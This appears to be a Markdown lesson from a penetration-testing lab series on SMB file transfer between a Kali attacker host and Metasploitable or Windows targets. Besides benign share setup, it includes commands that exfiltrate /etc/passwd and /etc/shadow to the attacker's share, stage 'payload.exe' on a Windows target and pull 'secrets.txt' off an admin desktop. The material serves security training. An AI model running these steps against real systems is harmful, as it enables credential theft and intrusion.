# 📂 SMB File Transfer — Step-by-Step Guide

> **What is it?** SMB (Server Message Block) is the protocol Windows uses for file sharing. You create a shared folder on Kali, and the target machine can access it like a network drive.

> **When to use?** Mainly for **Windows targets** — SMB is built into every Windows machine. Also works on Linux targets that have `smbclient`.

---

## 📋 What You Need

| Item               | Details                                      |
| ------------------ | -------------------------------------------- |
| **Kali IP**        | `192.168.56.10`                              |
| **Target IP**      | `192.168.56.20` (Linux) or `.30` (Windows)   |
| **Tool on Kali**   | `impacket-smbserver` (pre-installed on Kali) |
| **Tool on Target** | `smbclient` (Linux) or built-in (Windows)    |

---

## 🧠 How It Works

```
Kali (SMB Server)                    Target (SMB Client)
┌──────────────────┐                 ┌──────────────┐
│ Shares a folder  │ ◄── connects ── │ Browses the  │
│ named "share"    │ ── get/put ───→ │ shared folder│
│ on the network   │                 │ like a drive │
└──────────────────┘                 └──────────────┘
```

**In simple words**: Kali sets up a shared folder → Target connects and copies files in/out.

---

## 📥 Method 1: Basic SMB Server (No Password)

### Step 1: On Kali — start SMB server

```bash
cd ~/Documents/file_transfer_practice

# Start SMB server sharing current directory
sudo impacket-smbserver share $(pwd) -smb2support
```

> **What this means:**
> - `share` = the name of the shared folder (you can call it anything)
> - `$(pwd)` = share the current directory
> - `-smb2support` = enable modern SMB version 2 (needed for newer systems)

You'll see:

```
[*] Config file parsed
[*] Callback added for UUID 4B324FC8...
[*] Listening on port 445...
```

### Step 2: On Metasploitable (Linux) — connect and browse

```bash
# Connect to Kali's SMB share
smbclient //192.168.56.10/share -N
```

> **What `-N` means:** No password (anonymous login).

### Step 3: Inside smbclient — download/upload files

```bash
# You're now inside the SMB shell, like a mini FTP client
smb: \> ls                           # List files in the share
smb: \> get test_file.txt            # Download file from Kali
smb: \> put /etc/passwd passwd.txt   # Upload file to Kali
smb: \> exit                         # Leave
```

### Step 4: Verify

```bash
# On Metasploitable — check downloaded file
cat test_file.txt

# On Kali — check uploaded file
cat passwd.txt
```

---

## 📥 Method 2: SMB with Authentication (More Realistic)

> In real scenarios, SMB shares usually require a username and password.

### Step 1: On Kali — start SMB server with credentials

```bash
cd ~/Documents/file_transfer_practice

sudo impacket-smbserver share $(pwd) -smb2support -user test -password test
```

> Added `-user test -password test` for authentication.

### Step 2: On Linux target — connect with credentials

```bash
smbclient //192.168.56.10/share -U test
# When prompted, enter password: test
```

### On Windows target — connect with credentials

```cmd
REM Map network drive with credentials
net use \\192.168.56.10\share /user:test test

REM Copy file from share to local
copy \\192.168.56.10\share\test_file.txt C:\temp\

REM Copy local file TO share
copy C:\important.txt \\192.168.56.10\share\

REM Disconnect when done
net use \\192.168.56.10\share /delete
```

---

## 📥 Method 3: One-Liner for Windows (Quick Copy)

> No need to map a drive — just copy directly.

### On Windows target

```cmd
REM Download from share (no auth)
copy \\192.168.56.10\share\payload.exe C:\temp\payload.exe

REM Upload to share
copy C:\Users\admin\Desktop\secrets.txt \\192.168.56.10\share\
```

> **Why this is powerful**: Windows doesn't need any extra tools — SMB support is built-in!

---

## 📤 Method 4: Upload Files FROM Target to Kali

### Using smbclient on Linux target

```bash
smbclient //192.168.56.10/share -N -c "put /etc/shadow shadow.txt"
```

> **One-liner!** The `-c` flag lets you run a command without entering the interactive shell.

### Using smbclient — download in one-liner

```bash
smbclient //192.168.56.10/share -N -c "get test_file.txt"
```

---

## 🧠 Quick Reference Cheatsheet

| What You Want                        | Command                                                                       |
| ------------------------------------ | ----------------------------------------------------------------------------- |
| **Start SMB server (no auth)**       | `sudo impacket-smbserver share $(pwd) -smb2support`                           |
| **Start SMB server (with auth)**     | `sudo impacket-smbserver share $(pwd) -smb2support -user USER -password PASS` |
| **Connect from Linux**               | `smbclient //KALI_IP/share -N`                                                |
| **Download file (inside smbclient)** | `get filename`                                                                |
| **Upload file (inside smbclient)**   | `put /path/to/file`                                                           |
| **One-liner download (Linux)**       | `smbclient //KALI_IP/share -N -c "get filename"`                              |
| **Copy from share (Windows)**        | `copy \\KALI_IP\share\file C:\path\`                                          |
| **Copy to share (Windows)**          | `copy C:\path\file \\KALI_IP\share\`                                          |

---

## ❗ Common Mistakes & Fixes

| Problem                        | Fix                                                       |
| ------------------------------ | --------------------------------------------------------- |
| `NT_STATUS_CONNECTION_REFUSED` | SMB server not running on Kali, or wrong IP               |
| `NT_STATUS_ACCESS_DENIED`      | Server requires auth but you used `-N`. Add `-U username` |
| `protocol negotiation failed`  | Add `-smb2support` when starting the server               |
| Windows can't see share        | Check firewall on Kali: `sudo ufw allow 445`              |
| `smbclient: command not found` | Install: `sudo apt install smbclient`                     |

---

## ⚖️ SMB vs Other Methods

| Feature         | SMB               | HTTP                  | Netcat          |
| --------------- | ----------------- | --------------------- | --------------- |
| Windows support | ⭐⭐⭐ Built-in      | Needs PowerShell/curl | Rare            |
| Linux support   | Needs smbclient   | ⭐⭐⭐ wget/curl         | ⭐⭐⭐ nc          |
| Multiple files  | ⭐⭐⭐ Browse & pick | ⭐⭐⭐ Browse            | One at a time   |
| Auth support    | ⭐⭐⭐ Yes           | No (basic)            | No              |
| Best for        | Windows targets   | Linux targets         | Quick transfers |

---

## ✅ Practice Checklist

- [ ] Start SMB server on Kali (no auth)
- [ ] Connect from Metasploitable using `smbclient`
- [ ] Download a file using `get`
- [ ] Upload a file using `put`
- [ ] Try SMB server with authentication (`-user` and `-password`)
- [ ] Try one-liner download/upload with `-c` flag

---

> 🔙 **Previous**: [Netcat Transfer](./02_netcat_transfer.md)
> 🔙 **Back to**: [File Transfer Main Guide](./file_transfer.md)
> ➡️ **Next**: [SCP / SSH / SFTP Transfer](./04_scp_ssh_sftp_transfer.md)
